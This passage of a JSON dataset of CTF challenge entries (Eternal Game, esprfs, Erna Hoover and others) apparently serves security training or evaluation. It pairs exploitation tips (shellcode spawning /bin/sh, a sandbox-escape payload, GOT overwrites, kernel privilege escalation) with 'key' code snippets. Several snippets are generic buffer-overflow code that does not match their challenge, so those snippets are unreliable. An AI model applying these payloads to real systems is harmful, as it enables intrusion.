            "For heap exploitation, particularly in scenarios involving the manipulation of the heap to achieve arbitrary code execution, using size allocations that transition objects between different bin types (e.g., fastbins to smallbins) can be crucial for bypassing restrictions such as null byte limitations. This technique can leverage the behavior of bins (like unsorted bins coalescing and changing size) to perform targeted overwrites, such as null byte overwrites, to corrupt heap metadata or function pointers for control flow hijacking."
        ],
        "key": "```c\nvoid encrypt_string(void)\n\n{  \n long in_FS_OFFSET;  \n int local_30;  \n uint local_2c;  \n char **local_28;  \n char *local_20;  \n char *local_18;  \n long local_10;  \n  \n local_10 = *(long *)(in_FS_OFFSET + 0x28);  \n print_encryption_menu();  \n __isoc99_scanf(\"%d%*c\",&local_30);  \n local_28 = (char **)create_info();  \n if (local_28 != (char **)0x0) {  \n   if (local_30 == 1) {  \n     *(code **)(local_28 + 2) = key_encrypt;  \n     *(code **)(local_28 + 3) = print_key;  \n   }  \n   else {  \n     if (local_30 != 2) {  \n       puts(\"Not a valid choice\");  \n       goto LAB_00400e12;  \n     }  \n     *(code **)(local_28 + 2) = xor_encrypt;  \n     *(code **)(local_28 + 3) = print_xor;  \n   }  \n   printf(\"How long is your message?\\n>\");  \n   __isoc99_scanf(\"%d%*c\");  \n   local_2c = local_2c + 1;  \n   *(uint *)((long)local_28 + 0x24) = local_2c;  \n   local_20 = (char *)malloc((ulong)local_2c);  \n   printf(\"Please enter your message: \");  \n   fgets(local_20,local_2c,stdin);  \n   *local_28 = local_20;  \n   local_18 = (char *)malloc((ulong)local_2c);  \n   local_28[1] = local_18;  \n   (*(code *)local_28[2])(local_20,local_18,local_20,local_18);  \n   printf(\"Your encrypted message is: %s\\n\",local_18);  \n }  \nLAB_00400e12:  \n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n\nvoid remove_encrypted_string(void)\n\n{  \n long in_FS_OFFSET;  \n int local_14;  \n long local_10;  \n  \n local_10 = *(long *)(in_FS_OFFSET + 0x28);  \n printf(\"Enter the index of the message that you want to remove: \");  \n __isoc99_scanf(\"%d%*c\",&local_14);  \n if ((((local_14 < 0) || (0x13 < local_14)) || (*(long *)(information +\n(long)local_14 * 8) ==0))  \n    || (*(int *)(*(long *)(information + (long)local_14 * 8) + 0x20) == 1)) {  \n   puts(\"Not a valid index.\");  \n }  \n else {  \n   *(undefined4 *)(*(long *)(information + (long)local_14 * 8) + 0x20) = 1;  \n   free(**(void ***)(information + (long)local_14 * 8));  \n   free(*(void **)(*(long *)(information + (long)local_14 * 8) + 8));  \n }  \n if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n\nvoid edit_encrypted_message(void)\n\n{  \n long lVar1;  \n char *__s;  \n undefined8 uVar2;  \n long in_FS_OFFSET;  \n int local_24;  \n  \n lVar1 = *(long *)(in_FS_OFFSET + 0x28);  \n puts(\"Enter the index of the message that you wish to edit\");  \n __isoc99_scanf(\"%d%*c\");  \n if (((local_24 < 0) || (0x13 < local_24)) || (*(long *)(information +\n(long)local_24 * 8) ==0)) {  \n   puts(\"Invalid index\");  \n }  \n else {  \n   __s = **(char ***)(information + (long)local_24 * 8);  \n   uVar2 = *(undefined8 *)(*(long *)(information + (long)local_24 * 8) + 8);  \n   puts(\"Enter the new message\");  \n   fgets(__s,*(int *)(*(long *)(information + (long)local_24 * 8) +\n0x24),stdin);  \n   (**(code **)(*(long *)(information + (long)local_24 * 8) +\n0x10))(__s,uVar2,__s,uVar2);  \n }  \n if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {  \n                   /* WARNING: Subroutine does not return */  \n   __stack_chk_fail();  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "endless_wait",
        "write_up": "dataset/raw/endless_wait.md",
        "type": "reverse",
        "competition": [
            "boot2root/2020",
            "https://ctftime.org/event/1202/tasks/"
        ],
        "score": 473,
        "max_score": 496,
        "difficulty": 0.9536290322580645,
        "knowledge": [
            "In reverse engineering challenges involving anti-debugging techniques, identifying and neutralizing ptrace calls is essential for effective debugging. Tools like NOP (No Operation) slides can be employed to bypass these checks, allowing for a clearer analysis of the binary.\n   - Example approach to neutralize ptrace: Replace the ptrace call with NOP instructions using a binary editor or patching tool.",
            "When dealing with obfuscated strings or runtime-generated arrays within a binary, a methodical approach to analyze and de-obfuscate these strings can reveal hidden information or flags. Identifying the pattern or algorithm used to encode the string and applying the inverse operation can extract the flag.\n   - Example de-obfuscation technique: If a runtime array encodes a flag by interleaving irrelevant characters (e.g., every third character is part of the flag), writing a simple script or using manual analysis to extract the relevant characters can recover the flag."
        ],
        "key": "```c\n#include <stdio.h>\n#include <signal.h>\n#include <sys/ptrace.h>\n\nvoid handle_alarm(int sig) {\n    // Vulnerable to denial of service if alarm is not handled properly\n    printf(\"Alarm signal received\\n\");\n}\n\nint main() {\n    signal(SIGALRM, handle_alarm);\n    alarm(10); // Set an alarm for 10 seconds\n\n    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {\n        // Vulnerable to bypass if ptrace is not handled properly\n        printf(\"Debugger detected!\\n\");\n        return 1;\n    }\n\n    // Simulate some processing\n    for (int i = 0; i < 1000000; i++) {\n        // Do some work\n    }\n\n    printf(\"Processing complete\\n\");\n    return 0;\n}\n```"
    },
    {
        "name": "engineOnline",
        "write_up": "dataset/raw/engineOnline.md",
        "type": "reverse",
        "competition": [
            "0CTF/2017/Quals",
            "https://ctftime.org/event/402/tasks/"
        ],
        "score": 578,
        "max_score": 687,
        "difficulty": 0.8413391557496361,
        "knowledge": [
            "When exploiting binary programs that allow unrestricted write operations based on a controlled offset (\"ip\" in this context), an effective strategy is to manipulate the memory layout to inject malicious payloads or modify the program's execution flow. Specifically, arranging the input memory to be mapped above critical sections (like libc) enables the overwriting of sensitive structures or function pointers. This is often achieved by creating a sufficiently large input buffer, positioning it strategically in memory to overwrite target areas without directly addressing them, ensuring exploitation under constraints or specific memory layouts.",
            "For leaking address space layout randomization (ASLR) or gaining control over execution flow via library functions, manipulating file stream objects (like stderr) is a practical approach. Altering the vtable of such objects to point to controlled or fake vtables can lead to arbitrary code execution when library functions (e.g., _IO_flush_all_lockp) are subsequently called by the program. By partially overwriting the vtable pointer or the function pointers within the vtable to point to plt entries (e.g., gets_plt) or system, attackers can execute arbitrary commands or gain a shell. This method hinges on knowing the layout of libc and the binary in memory, plus having the ability to write to critical memory structures (like the vtable).\n\nExample payload steps: \n- Use the \"ip\" operation to modify stderr to point to a fake vtable.\n- Leak libc addresses using \"op\" to determine the base address.\n- Craft the fake vtable and stderr content to execute `system(\"/bin/sh\")` upon triggering a function call, typically set up to be invoked by standard program operations or cleanup routines."
        ],
        "key": "```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n}\n\nint main(int argc, char *argv[]) {\n    if (argc < 2) {\n        printf(\"Usage: %s <input>\\n\", argv[0]);\n        return 1;\n    }\n    vulnerable_function(argv[1]);\n    return 0;\n}\n```"
    },
    {
        "name": "Erna Hoover",
        "write_up": "dataset/raw/Erna Hoover.md",
        "type": "pwn",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "In scenarios where NX (No Execute) protections are disabled allowing execution of shellcode from the stack, one can inject a larger shellcode into an input buffer that is sufficiently sized and use a smaller trampoline shellcode to jump to this larger payload. This method is practical when there are restrictions on the size of directly executable shellcode. Example payloads for the trampoline and the larger shellcode are as follows:\n   - Trampoline Shellcode: `add rsp, 120; jmp rsp;`\n   - Larger Shellcode: \n   ```\n   xor eax, eax  \n   mov rbx, 0xFF978CD091969DD1  \n   neg rbx  \n   push rbx  \n   push rsp  \n   pop rdi  \n   cdq  \n   push rdx  \n   push rdi  \n   push rsp  \n   pop rsi  \n   mov al, 0x3b  \n   syscall  \n   ```",
            "When all security measurements except Partial RELRO are disabled in a challenge binary, it is advantageous to use existing protections' weaknesses such as executable stack space and no PIE (Position Independent Executable) to accurately target buffer addresses for exploit payloads. This approach bypasses the need to guess or leak addresses dynamically. In practical terms, knowing the binary does not employ Address Space Layout Randomization (ASLR) allows hardcoding payload addresses or calculating them relative to static landmarks like the `rsp` (stack pointer) register."
        ],
        "key": "```c  \nundefined8 main(void)  \n{  \n size_t sVar1;  \n char local_58 [64];  \n ssize_t local_18;  \n code *local_10;  \n  \n logo();  \n printf(\"\\x1b[38;5;161m Enter Username >>> \");  \n fgets(local_58,0x32,stdin);  \n sVar1 = strcspn(local_58,\"\\n\");  \n local_58[sVar1] = '\\0';  \n printf(\"\\x1b[38;5;161m Greetings, %s! You get 8 bytes of shellcode >>>\n\\n\",local_58);  \n local_10 = (code *)mmap((void *)0x88880000,0x1000,7,0x32,-1,0);  \n local_18 = read(0,local_10,8);  \n (*local_10)();  \n return 0;  \n}  \n```"
    },
    {
        "name": "escaped",
        "write_up": "dataset/raw/escaped.md",
        "type": "This CTF challenge is of type: `misc`",
        "competition": [
            "WolvCTF/2023",
            "https://ctftime.org/event/1866/tasks/"
        ],
        "score": 50,
        "max_score": 700,
        "difficulty": 0.07142857142857142,
        "knowledge": [
            "In a Python sandbox escape challenge, where the user input is sanitized to start and end with a double quote without including any literal double quotes within, escaping the quote check can be achieved using escape sequences. Specifically, `\\x22` can be utilized to represent a double quote in hexadecimal form, thereby bypassing the input restrictions. This technique allows for the execution of arbitrary Python commands within the constrained environment. Example payload: `\" \\x22+open('flag.txt').read()+\\x22 \"`",
            "In scenarios involving Python's `eval()` function, especially within a sandboxed environment that compiles and executes user-provided code, understanding how and when Python evaluates escape sequences can provide a method to circumvent restrictions. Escape sequences like `\\x22` are not evaluated until the `eval()` call, allowing for strategic placement in user input to manipulate the code execution flow for unintended outcomes, such as file reading or command execution."
        ],
        "key": "```python\nimport ast\n\ndef jail(user_input):\n    if user_input[0] != '\"' or user_input[-1] != '\"':\n        return \"Input must start and end with a double quote\"\n    if '\"' in user_input[1:-1]:\n        return \"Input cannot contain double quotes in between\"\n    \n    try:\n        # Vulnerable part: using eval with user input\n        compiled_code = ast.compile(f'print({user_input})', '<string>', 'exec')\n        eval(compiled_code)\n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = input(\"Enter your input: \")\njail(user_input)\n```"
    },
    {
        "name": "esprfs",
        "write_up": "dataset/raw/esprfs.md",
        "type": "This CTF challenge is a **pwn** (exploit) challenge. \n\nThe challenge involves finding and exploiting a double fetch vulnerability in a custom virtual file system that uses a naive Huffman encoding compression scheme. The vulnerability allows for a buffer overflow that can be used to manipulate memory and gain arbitrary read/write capabilities.\n\nThe intended exploit involves triggering the double fetch to overflow a compressed file's size, leveraging freelist randomization to predict the heap layout, and corrupting a file's metadata pointer to achieve arbitrary read/write capabilities. The final step involves leaking and manipulating the `cred` structure of the process to elevate privileges to `root`.\n\nAdditionally, there are mentioned unintended bugs that can be found as an exercise, adding complexity and depth to the challenge.",
        "competition": [
            "C3CTF/2017",
            "https://ctftime.org/event/544/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "Double-fetch vulnerabilities occur when a program fetches user-supplied data from user space into kernel space multiple times without validating if the data has changed between fetches. These vulnerabilities can be exploited by modifying the supplied data between the first and second fetches, leading to unpredictable behavior or security issues. To exploit such vulnerabilities in challenges focusing on file systems or similar, manipulate the data between fetches to influence program behavior. This can be particularly effective in systems where data structures (such as Huffman trees in compression algorithms) depend on the content of the supplied data. To trigger a specific behavior, consider modifying data in a way that the first fetch dictates one behavior (e.g., allocation size based on uncompressed data), and the second fetch, after alteration, leads to an overflow or unexpected behavior due to the re-evaluated size or structure (e.g., increase the length corresponding to a compressed file to read or write out of bounds).",
            "In kernel exploitation, especially with constraints such as SMEP (Supervisor Mode Execution Prevention) and SMAP (Supervisor Mode Access Prevention), leveraging control over metadata structures and pointer manipulation can lead to arbitrary read/write capabilities. This can be achieved by corrupting file system structures through exploitation techniques like the one described, where manipulating the length of data structures (e.g., through double-fetch vulnerabilities) allows for out-of-bound access. Then, by strategically freeing and creating files to manipulate the heap layout, attackers can overwrite pointers in metadata structures, gaining arbitrary read/write access. This method can be further leveraged to modify critical security structures, such as the `cred` structure in Linux, to escalate privileges. The key steps in such exploitation include creating a known state through heap manipulation (spraying and creating holes), exploiting a vulnerability to achieve unintended access or modification capabilities, and using these capabilities for privilege escalation or system compromise.\n\nExample Strategy for Heap Manipulation and Arbitrary R/W:\n\n- Spray the heap by creating a lot of files.\n- Free one out of every 10 files to introduce predictable holes in the heap.\n- Exploit a double-fetch vulnerability to overflow a size or length value.\n- Use controlled oversized reads or writes to identify and corrupt specific file metadata.\n- Manipulate the corrupted file to overwrite pointers in other object's metadata, aiming for unallocated space or specific targets for arbitrary read/write."
        ],
        "key": "```c\nssize_t write_data(const char __user *buffer, size_t len) {\n    // First fetch\n    char *kernel_buffer = kmalloc(len, GFP_KERNEL);\n    if (!kernel_buffer)\n        return -ENOMEM;\n    if (copy_from_user(kernel_buffer, buffer, len)) {\n        kfree(kernel_buffer);\n        return -EFAULT;\n    }\n\n    // Create Huffman tree and calculate required length\n    struct huffman_tree *tree = create_huffman_tree(kernel_buffer, len);\n    size_t required_len = calculate_required_length(tree);\n\n    // Second fetch\n    char *data_buffer = kmalloc(required_len, GFP_KERNEL);\n    if (!data_buffer) {\n        free_huffman_tree(tree);\n        kfree(kernel_buffer);\n        return -ENOMEM;\n    }\n    if (copy_from_user(data_buffer, buffer, len)) {\n        free_huffman_tree(tree);\n        kfree(kernel_buffer);\n        kfree(data_buffer);\n        return -EFAULT;\n    }\n\n    // Compress data\n    compress_data(tree, data_buffer, kernel_buffer, len);\n\n    // Clean up\n    free_huffman_tree(tree);\n    kfree(kernel_buffer);\n    kfree(data_buffer);\n\n    return len;\n}\n```"
    },
    {
        "name": "Eternal Game",
        "write_up": "dataset/raw/Eternal Game.md",
        "type": "crypto",
        "competition": [
            "TAMUctf/2020",
            "https://ctftime.org/event/1009/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve secret keys and hashing algorithms like SHA-512, a hash length extension attack can be applied if the hash is generated by preappending a secret key to known data and the hashing algorithm used is vulnerable (like SHA-512). This attack allows for the creation of a valid hash for extended data without knowing the secret key, by exploiting the way hash functions process input data. To perform this attack, one must have the hash of a known data concatenated with the secret (`SHA512(secret_key || known_data)`), the known data itself, and the hash function used. Brute force may be used to guess the secret key length if it's not known.",
            "In scenarios that involve handling user inputs and generating hashes from them, it's crucial to properly sanitize and validate all inputs, especially before they are passed to hash generation functions. In the provided challenge, the `extract_int` function failed to account for additional data appended to a legitimate number, allowing an attacker to append arbitrary data to the input. This flaw can be mitigated by strictly validating inputs to ensure they only contain expected data formats, using regular expressions or similar validation methods to prevent the injection of unauthorized data that could be used in attacks like hash length extension attacks."
        ],
        "key": "```python\ndef gen_hash(x):  \n   with open('key.txt', 'r') as f:  \n       key = f.read()[:-1]  \n       return hashlib.sha512(key + x).hexdigest()\n\ndef prize():  \n   print 'Input the number you reached: '  \n   sys.stdout.flush()  \n   num = raw_input()  \n   sys.stdout.flush()  \n   print 'Present the proof of your achievement: '  \n   sys.stdout.flush()  \n   proof = raw_input()  \n   sys.stdout.flush()  \n   num_hash = gen_hash(num)  \n   num = extract_int(num)\n\n   if proof == num_hash:  \n       if num > high_score:  \n           with open('flag.txt', 'r') as f:  \n               print f.read()  \n       elif num > 10**18:  \n           print 'It sure is a good thing I wrote this in Python. Incredible!'  \n       elif num > 10**9:  \n           print 'This is becoming ridiculous... almost out of bounds on a 32 bit integer!'  \n       elif num > 10**6:  \n           print 'Into the millions!'  \n       elif num > 1000:  \n           print 'Good start!'  \n       else:  \n           print 'You can do better than that.'  \n   else:  \n       print 'Don\\'t play games with me. I told you you couldn\\'t beat my high score, so why are you even trying?'  \n   sys.stdout.flush()\n```"
    },
    {
        "name": "Eternally Pwned_ Infiltration",
        "write_up": "dataset/raw/Eternally Pwned_ Infiltration.md",
        "type": "forensics",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When investigating potential data exfiltration or infiltration within a network, analyzing network traffic with tools such as Wireshark can reveal hidden or suspicious transmissions. Echo requests (ICMP packets) can be used by attackers to covertly send or receive data. Malicious payloads or sensitive information might be encoded in formats like Base64 within these packets.",
            "To uncover hidden messages or data within network traffic, look for patterns or anomalies such as encoded strings (e.g., Base64). Once located, these strings can be decoded to reveal potentially sensitive information, parts of a CTF flag, or other significant data. Using the search function in traffic analysis tools like Wireshark efficiently narrows down the potential points of interest amidst vast amounts of data."
        ],
        "key": "```python\nimport base64\n\ndef decode_base64(encoded_str):\n    try:\n        decoded_bytes = base64.b64decode(encoded_str)\n        decoded_str = decoded_bytes.decode('utf-8')\n        return decoded_str\n    except Exception as e:\n        print(f\"Error decoding base64: {e}\")\n        return None\n\n# Example of a vulnerable function that could be exploited if the input is not properly sanitized\ndef vulnerable_echo_request(input_data):\n    # Simulating an echo request that processes input data\n    # Potential vulnerability: if input_data is not sanitized, it could lead to code injection\n    print(f\"Processing request: {input_data}\")\n    # Decode the input data assuming it's base64 encoded\n    decoded_data = decode_base64(input_data)\n    if decoded_data:\n        print(f\"Decoded data: {decoded_data}\")\n    else:\n        print(\"Failed to decode data\")\n\n# Example usage\nvulnerable_echo_request(\"d2N0ZntsdDN0U18=\")  # This is a base64 encoded string\n```"
    },
    {
        "name": "euler-the-cat",
        "write_up": "dataset/raw/euler-the-cat.md",
        "type": "reverse",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 347,
        "max_score": 347,
        "difficulty": 1.0,
        "knowledge": [
            "In audio steganography challenges, inspecting the spectrogram of a provided audio file can reveal hidden messages or clues. Tools like Audacity can be used to visualize the audio file's spectrogram.",
            "If an audio file's content appears distorted or has unnatural transformations, consider using spectral editing tools to modify the spectrogram. This can involve vertically reflecting the spectrogram, deleting specific spectral regions, shifting frequencies using a Frequency Shifter, or reversing the audio to decode hidden messages. \n\n    Example steps for manipulation in Audacity:\n    - Use the \"Spectral Delete\" tool to remove unwanted spectral parts.\n    - Apply a \"Frequency Shifter\" plugin to move sections of the audio around based on identified patterns in the spectrogram.\n    - Reverse the audio segment to reveal the hidden message."
        ],
        "key": "```python\ndef apply_audio_effects(audio_data):\n    # Simulate the effect of the cat walking on the keyboard\n    # by reflecting the audio spectrogram vertically along 10000Hz\n    reflected_audio = reflect_spectrogram(audio_data, axis='vertical', frequency=10000)\n    \n    # Remove the bottom half of the spectrogram\n    top_half_audio = spectral_delete(reflected_audio, 'bottom_half')\n    \n    # Shift the frequency of the top half down by 10000Hz\n    shifted_audio = frequency_shifter(top_half_audio, shift=-10000)\n    \n    # Reverse the audio to get the original message\n    reversed_audio = reverse_audio(shifted_audio)\n    \n    return reversed_audio\n\ndef reflect_spectrogram(audio_data, axis, frequency):\n    # Placeholder function to reflect the spectrogram\n    pass\n\ndef spectral_delete(audio_data, section):\n    # Placeholder function to delete a section of the spectrogram\n    pass\n\ndef frequency_shifter(audio_data, shift):\n    # Placeholder function to shift the frequency\n    pass\n\ndef reverse_audio(audio_data):\n    # Placeholder function to reverse the audio\n    pass\n```"
    },
    {
        "name": "Evil_boost",
        "write_up": "dataset/raw/Evil_boost.md",
        "type": "reverse",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 740,
        "max_score": 952,
        "difficulty": 0.7773109243697479,
        "knowledge": [
            "In scenarios dealing with command-line argument parsing vulnerabilities, especially when linked with conditional checks based on the parsed arguments to reveal a secret or perform specific operations, examine the conditional logic and corresponding values carefully. Manipulating these argument values may lead to unexpected behaviors or exposures of sensitive information, such as bypassing checks for revealing hidden messages or flags. \n   - Example: Provide specific argument values that meet the conditional checks, i.e., `--cplusplus 999 --python 777 --javascript 233`.",
            "When dealing with challenges that include arithmetic expression parsing or calculation, especially when using libraries like Boost.Spirit for evaluating expressions from strings, investigating the input pattern and finding expressions that fit the required conditions (such as length or specific character presence) can lead to the solution. Additionally, understanding the result of the expression's evaluation in the context of the challenge's logic is crucial. This can lead to reverse-engineering the correct input or exploiting the input validation logic.\n   - Example: To find an input that results in a specific value, knowing the restrictions (e.g., length is 11, must contain 5 numbers and one lowercase letter 'e', only certain operations are allowed), you can craft an input like `5e0*(5-1/5)` that fits these conditions and evaluates to the target number."
        ],
        "key": "```cpp\nif (vm.count(\"name\")) {  \n    std::string __name = vm[\"name\"].as<std::string>();  \n    char c1 = vm[\"cplusplus\"].as<int>();  \n    char c2 = vm[\"python\"].as<int>();  \n    char c3 = vm[\"javascript\"].as<int>();\n\n    if (vm[\"cplusplus\"].as<int>() == 999) {  \n        if (vm[\"python\"].as<int>() == 777) {  \n            if (vm[\"javascript\"].as<int>() == 233) {  \n                unsigned char enc_false_flag[25] = {  \n                    0x4c,0x70,0x71,0x6b,0x38,0x71,0x6b,0x38,0x6c,  \n                    0x70,0x7d,0x38,0x6f,0x6a,0x77,0x76,0x7f,0x38,  \n                    0x7e,0x74,0x79,0x7f,0x36,0x36,0x36  \n                };  \n                for (int i = 0; i < 25; i++) {  \n                    if (((unsigned char)__name[i] ^ (char)(c1 + c2 * c3)) != enc_false_flag[i]) {  \n                        std::cout << \"error\" << std::endl;  \n                        _exit(i);  \n                    }  \n                }  \n            }  \n            std::cout << \"You get the flag! flag{\" << __name << \"}\" << std::endl;  \n            //flag{This is the wrong flag...}  \n        }  \n    }  \n}\n```"
    },
    {
        "name": "ex5",
        "write_up": "dataset/raw/ex5.md",
        "type": "reverse",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": -1,
        "max_score": 940,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a file of an unknown type and the `file` command does not recognize its format, investigating the file's magic bytes (the initial sequence of bytes that indicates the file type) can provide clues about the appropriate software or tool needed to interact with or analyze the file. This approach can lead to discovering that a specialized application is required to handle the file, as was the case with the EX5 file extension being associated with MetaTrader5, a platform for trading and technical analysis.",
            "If reverse engineering or analyzing a script reveals encoded or encrypted data, particularly where a portion of the output (e.g., a flag format) is already known, XOR cipher can be a viable method to decrypt the data. In scenarios where the encrypted data or flag is suspected to be XOR'd with a repeating pattern or a sequential numeric key, applying a XOR operation with the known pattern or generating a key sequence based on the pattern length can reveal the hidden content.\n   - Example of applying XOR operation with a sequential numeric key:\n     ```python\n     xor('EncryptedDataHere', range(0, LengthOfKey))\n     ```"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[50];\n    strcpy(buffer, input); // Vulnerability: No bounds checking\n    printf(\"Hello hacker!\\n\");\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    } else {\n        printf(\"Try again!\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Excellent Vista!",
        "write_up": "dataset/raw/Excellent Vista!.md",
        "type": "The type of this CTF challenge is: **forensics**",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "When faced with an OSINT challenge involving an image, examining the Exif data can provide valuable clues including GPS coordinates, date/time the photo was taken, and camera details. This requires tools like `exiftool`. Command to use: `exiftool [image file]`.",
            "GPS coordinates found in the Exif data of images can be transformed into a human-readable format or directly used in map services like Google Maps to pinpoint the location where the image was taken. This process involves replacing \"deg\" with the degree symbol and conducting a simple search with the coordinates."
        ],
        "key": "```python\n# Possible vulnerable code snippet for handling image uploads with Exif data\n\nfrom PIL import Image\nfrom PIL.ExifTags import TAGS\n\ndef extract_exif_data(image_path):\n    try:\n        image = Image.open(image_path)\n        exif_data = image._getexif()\n        if exif_data is not None:\n            for tag_id, value in exif_data.items():\n                tag = TAGS.get(tag_id, tag_id)\n                print(f\"{tag:25}: {value}\")\n    except Exception as e:\n        print(f\"Error processing image: {e}\")\n\n# Example usage\nextract_exif_data(\"ExcellentVista.jpg\")\n```\n"
    },
    {
        "name": "Exploitation Class",
        "write_up": "dataset/raw/Exploitation Class.md",
        "type": "pwn",
        "competition": [
            "P.W.N/2018",
            "https://ctftime.org/event/639/tasks/"
        ],
        "score": 356,
        "max_score": 792,
        "difficulty": 0.4494949494949495,
        "knowledge": [
            "For challenges involving buffer overflows in C programs, where data is written out of bounds due to improper index validation, first identify the flawed boundary check and understand its implications (such as overwriting adjacent memory). Then leverage this vulnerability to manipulate stack data (like canaries) or function pointers for control flow hijacking. When exploiting buffer overflow, ensure to carefully calculate offsets and sizes to avoid null terminators which could prematurely end your payload. This technique is utilized to leak sensitive information and execute arbitrary code. For instance, manipulating a vulnerable `writeData` function with incorrect index limits to overwrite adjacent memory and execute a ROP chain. \n    - Example payload snippet: \n    ```python\n    write(21, \"B\" * 12) # Overflow buffer to reach adjacent memory\n    canary = u64(read(21)[0xc:0xc+8]) - ord('C') # Leak the canary\n    ```",
            "When exploiting vulnerabilities that allow writing arbitrary values to arbitrary locations (like overwriting GOT entries), use this to redirect execution flow to your advantage, such as modifying the GOT to point to a one_gadget or system function, bypassing the need for code execution directly. In scenarios where the program uses inputs to modify entries at arbitrary indices, careful planning can enable libc address leaking and GOT hijacking. Ensure to calculate the correct offsets relative to the GOT and program sections to successfully redirect execution.\n    - Example payload snippet: \n    ```python\n    libc_addr = leak_qword(0x4018 - 0x4080) - e.symbols[\"printf\"]  # Leaking libc address\n    shoot_qword(0x4030 - 0x4080, libc_addr + 0x4526a)  # Overwrite GOT entry for \"exit\" with one_gadget\n    ```"
        ],
        "key": "```c\nunsigned __int64 __fastcall writeData(char *a1)  \n{  \n unsigned int v2; // [rsp+4h] [rbp-14h]  \n unsigned __int64 v3; // [rsp+8h] [rbp-10h]\n\n v3 = __readfsqword(0x28u);  \n puts(\"Which entry to write?\");  \n v2 = 0;  \n __isoc99_scanf(\"%u\", &v2;;  \n if ( v2 <= 0xFC )  \n {  \n   puts(\"What to write?\");  \n   read(0, &a1[12 * v2], 0xCuLL);  \n }  \n return __readfsqword(0x28u) ^ v3;  \n}  \n```\n\n```c\nchar vulnbuf[1024]; // [rsp+0h] [rbp-420h]  \nint (__fastcall *func_addr)(char *, int, int); // [rsp+400h] [rbp-20h]  \n//...  \nfread(vulnbuf, 1uLL, (signed int)vullen, stdin);  \nfunc_addr(vulnbuf, vullen, v7);  \n```\n\n```c\nif ( v5 <= 31 )//v5 < 0  \n{  \n  printf(\"the value at %d is %hhd. give me a new value:\\n> \", (unsigned\nint)v5, (unsigned int)array[v5]);  \n  v3 = &v4;  \n  if ( (unsigned int)__isoc99_scanf(\"%hhd\", &v4) != 1 )  \n    break;  \n  array[v5] = v4;  \n}  \n```"
    },
    {
        "name": "extended-fibonacci-sequence",
        "write_up": "dataset/raw/extended-fibonacci-sequence.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "When solving challenges involving generating Fibonacci sequences or their variations, implementing recursive functions in Python might significantly reduce the complexity of the solution. However, when dealing with large Fibonacci numbers or sequences, this method becomes highly inefficient due to repeated calculations. To enhance performance, caching previously calculated Fibonacci numbers using Python's `functools.lru_cache` decorator can greatly reduce computation time by avoiding redundant calculations.\n   ```python3\n   import functools\n\n   @functools.lru_cache(None)  \n   def fib(n):  \n      if n <= 1:  \n          return n  \n      return fib(n - 1) + fib(n - 2)\n   ```",
            "In challenges where the task involves communicating with a server (e.g., via netcat) to send and receive data, it's common to parse the received data to extract specific information needed to progress in the challenge. Regular expressions (regex) can be used to search and extract numerical data or other patterns from strings. This approach is particularly useful for handling server responses that include a prompt or specific data format. Once the necessary data is extracted and processed, it can be sent back to the server using socket programming libraries such as `pwntools` for Python.\n   Example for extracting number from server response and sending a processed answer:\n   ```python3\n   import re\n   from pwn import *\n\n   io = process(['nc', 'example.com', 'port'])\n   data = io.recvuntil(\":\").decode()\n   n = int(re.search(\"(\\d{1,})\\n\", data).group(0))\n   # Process n to compute the response, then:\n   io.sendline(str(response))\n   ```"
        ],
        "key": "```python\ndef exFib(n):  \n   if n <= 0:  \n       return \"0\" + str(fib(n))  \n   return exFib(n - 1) + str(fib(n))\n```"
    },
    {
        "name": "external",
        "write_up": "dataset/raw/external.md",
        "type": "This CTF challenge write-up is categorized as a **pwn** challenge.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 467,
        "max_score": 1000,
        "difficulty": 0.467,
        "knowledge": [
